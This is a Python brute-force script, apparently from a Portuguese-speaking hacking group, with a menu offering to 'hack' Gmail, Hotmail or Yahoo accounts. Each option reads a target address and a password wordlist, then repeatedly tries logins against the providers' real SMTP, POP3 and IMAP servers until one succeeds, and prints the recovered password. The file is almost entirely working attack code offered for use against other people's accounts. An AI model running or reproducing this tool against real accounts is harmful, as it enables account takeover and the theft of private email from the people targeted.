#!/usr/bin/python3

import smtplib, subprocess, poplib, imaplib, poplib, time
from imaplib import IMAP4
from poplib import POP3


#################
a = "\033[1;32m"
b = "\033[1;31m"
c = "\033[1;33m"
d = "\033[1;34m"
f = "\033[1;37m"
aa = "\033[0;32m"
#################

def main():
    print('''\033[0;34m

MM""""""""`M oo                dP M""MMMMM""M                   M"""""`'"""`YM          oo dP 
MM  mmmmmmmM                   88 M  MMMM' .M                   M  mm.  mm.  M             88 
M'      MMMM dP 88d888b. .d888b88 M       .MM .d8888b. dP    dP M  MMM  MMM  M .d8888b. dP 88 
MM  MMMMMMMM 88 88'  `88 88'  `88 M  MMMb. YM 88ooood8 88    88 M  MMM  MMM  M 88'  `88 88 88 
MM  MMMMMMMM 88 88    88 88.  .88 M  MMMMb  M 88.  ... 88.  .88 M  MMM  MMM  M 88.  .88 88 88 
MM  MMMMMMMM dP dP    dP `88888P8 M  MMMMM  M `88888P' `8888P88 M  MMM  MMM  M `88888P8 dP dP 
MMMMMMMMMMMM    \033[1;31mVersao : 2.0\033[0;34m     MMMMMMMMMMM               .88  MMMMMMMMMMMMMM
                                                        d8888P
''')

    print("""\033[0;37m
          ....
        .' ;' ;             ;''''.  \033[1;32m| Author: Mister Cyber         \033[0;37m
        ;| ; |;            ;;    ;  \033[1;32m| Date  : 2020/2021          \033[0;37m
        ;| ; |;            ;;.   ;  \033[1;32m| Canal : Legiao Anonyma       \033[0;37m
        ;  ~~~~',,,,,,,    '. '  ;  \033[1;32m| tool  : BruteForce          \033[0;37m
        ;\033[1;33m    -A\033[0;37m       ;      ';  ;  \033[1;32m| https://sadamalsharabi.blogspot.com \033[0;37m
        ;       .....'        ;  ;
        ;      _;             ;  ;
        ;   __(o)__.          ;  ;
       .;  '\--\\--\          '   ;
     .'\ \_.._._\\......,.,.,’    ;
   .''   |       ;   ';     '    '
  ;      |      .'    ;..,,.,,,,.'
  ;      |    .'  ...'
           \n\n\n""")


subprocess.call("clear", shell=True)
main()
print(b+"═══["+f+" 01"+b+" ]"+a+" Hackear Gmail")
print(b+"═══["+f+" 02"+b+" ]"+a+" Hackear Hotmail")
print(b+"═══["+f+" 03"+b+" ]"+a+" Hackear Yahoo")
print(b+"═══["+f+" 00"+b+" ]"+a+" Sair")
hack = int(input("\033[1;31m\n═══━ \033[1;32mEscolha uma opcao » "))


############
def gmail():
       try:
          main()
          print(d+"——————————————————————————————————————————————")
          print(b+"%%%%%%%%%%%%% "+a+"Brute Force Gmail"+b+" %%%%%%%%%%%%%%")
          print(d+"——————————————————————————————————————————————\n\n")
          email = input("\033[1;31m╔═══━\033[1;32m Email que deseja Hackea »»\033[1;37m ")
          passfile = input("\033[1;31m╚═══━\033[1;32m Entre com uma wordlist  »»\033[1;37m  ")
          passfile = open(passfile,'r').readlines()
       except KeyboardInterrupt:
           print(b+"\n\n[-] Voce pressionou Ctrl+C para cancelar!")
           quit()
       print(" ")
       x = 1

       for password in passfile:
           try:
              server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
              server.ehlo()
              server.login(email, password)
              main()
              print(d+"——————————————————————————————————————————————")
              print(b+"%%%%%%%%%%%%%%%%"+a+" Gmail Hackeado "+b+"%%%%%%%%%%%%%%")
              print(d+"——————————————————————————————————————————————\n")
              print(b+"[+]"+a+" Email : "+f+email+"\n"+b+"[+]"+a+" Senha : "+f+password+"\n\n")
              break
           except KeyboardInterrupt:
              print(b+"\n\n[-] Voce pressionou Ctrl+C para cancelar!")
              quit()

           except smtplib.SMTPAuthenticationError:
              print(f+"["+c+str(x) + '/' + str(len(passfile))+f+"]"+a+" Password not Found : "+b+password)
              x += 1
              continue

           except smtplib.SMTPNotSupportedError:
               print(b+"\n\n[-] Autenticacao nao suportada pelo servidor")

           except smtplib.SMTPServerDisconnected:
               tenta = input("\033[1;31m[-] Conexão fechada inesperadamente, Reiniciar (y/N)? ").lower()
               if tenta == 'y':
                  gmail()
               else:
                  quit()

##############
def hotmail():
       try:
          main()
          print(d+"——————————————————————————————————————————————")
          print(b+"%%%%%%%%%%%%% "+a+"Brute Force Hotmail"+b+" %%%%%%%%%%%%")
          print(d+"——————————————————————————————————————————————\n\n")
          email = input("\033[1;31m╔═══━\033[1;32m Hotmail que deseja Hackea »»\033[1;37m ")
          passfile = input("\033[1;31m╚═══━\033[1;32m Entre com uma wordlist    »»\033[1;37m  ")
          passfile = open(passfile,'r').readlines()
       except KeyboardInterrupt:
          print(b+"\n\n[-] Voce pressionou Ctrl+C para cancelar!")
          quit()
       print(" ")
       x = 1

       for password in passfile:
           try:
              server = poplib.POP3_SSL('pop3.live.com', 995)
              server.user(email)
              server.pass_(password)
              main()
              print(d+"——————————————————————————————————————————————")
              print(b+"%%%%%%%%%%%%%%%%"+a+" Hotmail Hackeado "+b+"%%%%%%%%%%%%")
              print(d+"——————————————————————————————————————————————\n")
              print(b+"[+]"+a+" E-mail : "+f+email+"\n"+b+"[+]"+a+" Senha : "+f+password+"\n\n")
              break
           except KeyboardInterrupt:
              print(b+"\n\n[-] Voce pressionou Ctrl+C para cancelar!")
              quit()

           except poplib.error_proto:
              print(f+"["+c+str(x) + '/' + str(len(passfile))+f+"]"+a+" Password not Found : "+b+password)
              x += 1
              continue

############
def yahoo():
       try:
          main()
          print(d+"——————————————————————————————————————————————")
          print(b+"%%%%%%%%%%%%% "+a+"Brute Force Yahoo"+b+" %%%%%%%%%%%%%%")
          print(d+"——————————————————————————————————————————————\n\n")
          email = input("\033[1;31m╔═══━\033[1;32m Yahoo que deseja Hackea »»\033[1;37m ")
          passfile = input("\033[1;31m╚═══━\033[1;32m Entre com uma wordlist  »»\033[1;37m  ")
          passfile = open(passfile,'r').readlines()
       except KeyboardInterrupt:
          print(b+"\n\n[-] Voce pressionou Ctrl+C para cancelar!")
          quit()
       print(" ")
       x = 1

       for password in passfile:
           try:
              conn = imaplib.IMAP4_SSL('imap.mail.yahoo.com', 993)
              conn.login(email, password[:-1])
              main()
              print(d+"——————————————————————————————————————————————")
              print(b+"%%%%%%%%%%%%%%%%"+a+" Yahoo Hackeado "+b+"%%%%%%%%%%%%%%")
              print(d+"——————————————————————————————————————————————\n")
              print(b+"[+]"+a+" E-mail : "+f+email+"\n"+b+"[+]"+a+" Senha : "+f+password+"\n\n")
              conn.logout()
              break
           except KeyboardInterrupt:
              print(b+"\n\n[-] Voce pressionou Ctrl+C para cancelar!")
              quit()

           except IMAP4.error:
              print(f+"["+c+str(x) + '/' + str(len(passfile))+f+"]"+a+" Password not Found : "+b+password)
              x += 1
              continue

           except IMAP4.abort as erro:
               print(b+"\n\n[-] ",erro)
               quit()

if hack == 1:
     subprocess.call("clear", shell=True)
     gmail()
elif hack == 2:
     subprocess.call("clear", shell=True)
     hotmail()
elif hack == 3:
     subprocess.call("clear", shell=True)
     yahoo()
elif hack == 0:
     quit()
else:
     print("[-] Command not found!")
     quit()
